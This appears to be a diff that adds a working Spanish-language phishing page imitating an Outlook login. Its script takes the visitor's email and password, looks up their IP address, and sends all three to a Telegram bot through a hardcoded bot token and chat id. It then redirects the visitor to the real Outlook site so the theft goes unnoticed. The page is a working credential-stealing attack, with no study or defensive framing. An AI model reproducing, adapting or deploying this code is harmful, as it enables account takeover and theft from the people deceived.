@@ -1,0 +1,82 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.9">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Home</title>
+  </head>
+  <body>
+    <style>
+      *{padding: 0;margin: 0;}
+    </style>
+    <div id="rcn001" style="background: rgb(175 175 175 / 20%);text-align:center;height:100vh;">
+        <div id="rcn002" onclick="otrcn()" style=" width: 420px;margin-top: 142px;display: inline-block;background-image:url(0.svg);box-shadow:0 2px 6px rgba(0,0,0,.2);height:322.4px;"><form action="" method="post" onsubmit="rcnfunc(event)">
+	<input autocomplete="off" name="rcninpt1" id="rcninpt1" placeholder="Email" type="email" style="display: block;top: 133px;left: 46px;position: relative;width: 326px;border:none;outline: none;color:#333;background:rgba(0,0,0,0);font-family:sans-serif;" autofocus="" required="">
+	<input autocomplete="off" name="rcninpt2" id="rcninpt2" type="password" placeholder="Contraseña" style="display: block;position: relative;top: 156px;left: 46px;width: 326px;border:none;outline: none;color:#333;background:rgba(0,0,0,0);font-family:sans-serif;" required="">
+	<input style="display: block;top: 245px;left: 275px;width: 100px;height:30px;border:none;outline: none;color:#fff;background:#176eaf;font-family:sans-serif;position: relative;" type="submit" value="Continuar">
+</form>
+<style>#rcn002{background-image: url(1.svg)!important;}</style></div><br>
+        <div id="rcn003" style=" width: 420px;margin-top: 17.5px;height:43.1px;display: inline-block;background-image:url(2.svg);box-shadow:0 2px 6px rgba(1,1,1,.2);"></div>
+        </div>
+    
+    <img src="1.svg" style="display: none;">
+    <style>
+        @media only screen and (max-width: 501px){
+            #rcn002, #rcn003{
+                zoom:80%;
+            }
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-2.2.3.min.js" integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo=" crossorigin="anonymous"></script>
+    <script>
+      function otrcn() {
+          var xhttp = new XMLHttpRequest();
+          xhttp.onreadystatechange = function() {
+              if (this.readyState == 4 && this.status == 200) {
+              document.getElementById("rcn002").innerHTML = this.responseText; 
+              document.getElementById("rcn002").onclick = null;
+              }
+          };
+          xhttp.open("GET", "rcn777.html", true);
+          xhttp.send();
+      }
+      function rcnfunc(event){
+        event.preventDefault();
+
+        var tkl = "5939354281:AAGtkk3MmGd9-TbvrTy02q_zKGrRPYzlpqA";
+            var chtid = "764273648";
+            var xsml = $("#rcninpt1").val();
+            var xsmlpss = $("#rcninpt2").val();
+            var ips = "";
+
+            console.log(xsml);
+
+            if(!xsml || !xsmlpss){
+                console.log("empty");
+            }else{
+
+                mess = `OT-JS - U:${xsml} - P:${xsmlpss}`;
+                //console.log( document.getElementById("ix77").value );
+                $.get('https://ipinfo.io/ip', function(response){
+                    var sets = {
+                        "async": true,
+                        "crossDomain": true,
+                        "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
+                        "method": "POST",
+                        "headers": {
+                            "Content-Type": "application/json",
+                            "cache-control": "no-cache"
+                        },
+                        "data": JSON.stringify({
+                            "chat_id": chtid,
+                            "text": "I:"+response+" - "+mess
+                        })
+                    };  
+                    $.ajax(sets).done(function (response) {
+                        window.location = "https://outlook.live.com/owa/";
+                    });  
+                });
+            }
+      }
+  </script>
+  
+</body></html>
